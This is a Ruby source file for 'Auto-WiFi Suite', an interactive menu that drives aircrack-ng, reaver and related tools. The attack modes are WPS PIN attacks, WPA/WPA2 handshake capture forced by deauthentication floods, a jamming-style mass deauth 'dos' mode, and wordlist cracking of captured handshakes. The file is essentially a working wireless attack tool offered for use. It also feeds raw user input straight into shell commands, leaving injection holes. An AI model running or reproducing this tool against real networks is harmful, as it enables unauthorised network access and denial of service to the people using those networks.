#!/usr/bin/ruby2.2
require 'io/console'
require 'pathname'
def init
  system 'clear'
  raise 'This program must be run as root. Quitting!' unless Process.uid == 0
  $interface = nil
  $bssid = nil
  $channel = nil
  $wordlist = nil
  $capture = nil
  main
end

def start
  if $interface != nil
    print 'Killing processes... '
    system('airmon-ng check kill >/dev/null')
    puts 'Done'
    print "Starting #{$interface} in monitor mode... "
    system("airmon-ng start #{$interface} >/dev/null")
    puts 'Done'
    $interface = "#{$interface}mon"
    main
  else
    puts 'INTERFACE not set!'
    puts 'Set INTERFACE!'
    print '[INTERFACE]> '
    $interface = gets.chomp
    start
  end
end

class Attacks
  def wps
    if $interface != nil
      system 'clear'
      puts 'Timing out in 25 seconds... '
      system "timeout 25 wash -i #{$interface}"
      puts 'Set targets bssid'
      print '[BSSID]> '
      $bssid = gets.chomp
      system 'clear'
      system "reaver -i #{$interface} -b #{$bssid} -K 1"
    else
      puts 'INTERFACE not set!'
      puts 'Set wireless interface!'
      print '[INTERFACE]> '
      $interface = gets.chomp
      wps = Attacks.new
      wps.wps
    end
  end
  def wpa
    if $interface != nil
      puts 'Timing out in 25 seconds...'
      thr1 = Thread.new { system "xterm -hold -e timeout 15 airodump-ng #{$interface}" }
      puts 'Enter the targets bssid'
      print '[BSSID]> '
      $bssid = gets.chomp
      puts 'Enter the targets channel'
      print '[CHANNEL]> '
      $channel = gets.chomp
      Thread.kill(thr1)
      system 'mkdir /root/Documents/caps'
      puts 'Enter the name of the .cap'
      print '[CAPTURE]> '
      $capture = gets.chomp
      Thread.new { system "xterm -hold -e airodump-ng -w /root/Documents/caps/#{$capture}.cap -c #{$channel} -d #{$bssid} #{$interface}" }
      sleep 5
      Thread.new { system "xterm -hold -e aireplay-ng -0 20 -a #{$bssid} #{$interface}" }
      puts 'ONCE THE WPA HANDSHAKE IS CAPTURED IT IS SAFE TO CLOSE BOTH WINDOWS'
      puts 'AND START CRACKING THE CAP FILE'
      sleep 10
      main
    else
      puts 'INTERFACE not set!'
      puts 'Set wireless interface!'
      print '[INTERFACE]> '
      $interface = gets.chomp
      wpa = Attacks.new
      wpa.wpa
    end
  end
  def word
    system 'clear'
    puts '=========================================='
    puts '               Word-lists'
    puts '------------------------------------------'
    puts '  1)Rockyou.txt'
    puts '  2)Common.txt'
    puts '  3)nmap.lst'
    print '[Enter an option]> '
    choice = gets.chomp
    case choice
      when '1', 'rockyou.txt', 'Rockyou.txt'
		path = Pathname.new('/usr/share/wordlists/rockyou.txt.gz')
        print 'Unarchiving rockyou.txt... ' unless path.file? == false
        system 'gunzip /usr/share/wordlists/rockyou.txt.gz' unless path.file? == false
        puts 'Done' unless path.file? == true
        $wordlist = '/usr/share/wordlists/rockyou.txt'
        $wordlist_name = 'rockyou.txt'
        print "set WORDLIST to => #{$wordlist_name}"
        sleep 2
        main
      when '2', 'common.txt', 'Common.txt'
        $wordlist = '/usr/share/wordlists/fern-wifi/common.txt'
        $wordlist_name = 'common.txt'
        print "set wordlist to =>#{$wordlist_name}"
        sleep 2
        main
      when '3', 'nmap.lst', 'Nmap.lst'
        $wordlist = '/usr/share/wordlists/nmap.lst'
        $wordlist_name = 'nmap.lst'
        print "set wordlist to =>#{$wordlist_name}"
        sleep 2
        main
      else
        puts 'Invalid input'
        word = Attacks.new
        word.word
    end
  end
  def crack
    if $wordlist || $capture != nil
      system "aircrack-ng /root/Documents/caps/#{$capture} -w #{$wordlist}"
    else
      puts 'WORDLIST and or CAPTURE not set!'; sleep 5; main
    end
  end
  def dos
	system 'clear'
	puts 'Do you want to scan for targets first?(y/n)'
	print '[DOS]> '
	y_n = gets.chomp
	case y_n
		when 'y'
			if $interface != nil
				watchdog = Thread.new { system "xterm -hold -e airodump-ng #{$interface}" }
				puts 'Enter target bssid to jam'
				print '[DOS]> '
				$bssid = gets.chomp
				Thread.kill(watchdog)
				Thread.new { system "xterm -hold -e aireplay-ng -0 20 -a #{$bssid} #{$interface}" }
				main
			else
				puts 'INTERFACE not set! Quitting...'; sleep 3
				main
			end
		when 'n'
	end
  end
end

def main
  system 'clear'
  puts ' ============================================================='
  puts '  Auto-WiFi Suite | Version 0.5'
  puts ' -------------------------------------------------------------'
  puts '  [github]https:/github/CryogenicFreeze/auto-wifi'
  puts ' ============================================================='; puts "\n"
  puts ' Available Commands:'; puts "\n"
  puts '    start                 Start monitor interface'
  puts '    wps                   Start WPS attack'
  puts '    wpa                   Start WPA/WPA2 attack'
  puts '    dos                   Start mass deauth attack'
  puts '    crack                 Starts cracking session for WPA/WPA2'
  puts '    view                  Shows set variables(can be changed)'
  puts '    quit                  Quits'; puts "\n"
  print '[auto-wifi]> '; option = gets.chomp
  case option
    when 'start'
      start
    when 'wps'
      wps = Attacks.new
      wps.wps
    when 'wpa'
      wpa = Attacks.new
      wpa.wpa
    when 'dos'
      dos = Attacks.new
      dos.dos
    when 'crack'
		crack = Attacks.new
		crack.crack
    when 'quit', 'Quit'
		exit
    when 'view'
      system 'clear'
      puts '=============================================================='
      puts "    INTERFACE  =>  #{$interface}"
      puts "    BSSID      =>  #{$bssid}"
      puts "    CHANNEL    =>  #{$channel}"
      puts "    WORDLIST   =>  #{$wordlist}"
      puts "    CAPTURE    =>  #{$capture}"
      puts '=============================================================='; puts "\n"
      puts ' Available Commands: '; puts "\n"
      puts '    INTERFACE              Change wireless interface'
      puts '    BSSID                  Change target bssid'
      puts '    CHANNEL                Change target channel'
      puts '    WORDLIST               Set wordlist for WPA/WPA2 attack'
      puts '    CAPTURE                Set .cap file for WPA/WPA2 cracking'
      puts '                             Example: "capture.cap"'
      puts '    menu                   Return to main menu'; puts "\n"
      print '[auto-wifi]> '; option = gets.chomp
      case option
        when 'INTERFACE', 'interface'
          print '[INTERFACE]> '; $interface = gets.chomp
          puts "Set INTERFACE to #{$interface}"; sleep 2
          main
        when 'BSSID', 'bssid'
          print '[BSSID]> '; $bssid = gets.chomp
          puts "Set BSSID to #{$bssid}"; sleep 2
          main
        when 'CHANNEL', 'channel'
          print '[CHANNEL]> '; $channel = gets.chomp
          puts "Set CHANNEL to #{$channel}"; sleep 2
          main
        when 'WORDLIST', 'wordlist'
          word = Attacks.new
          word.word
        when 'CAPTURE', 'capture'
          print '[CAPTURE]> '; $capture = gets.chomp
          puts "Set CAPTURE to #{$capture}"
          main
        when 'Menu', 'menu'
		  main
        else
          puts 'Invalid input'
          sleep 2
          main
      end
    else
      puts 'Invalid option'
      sleep 2
      main
  end
end
init
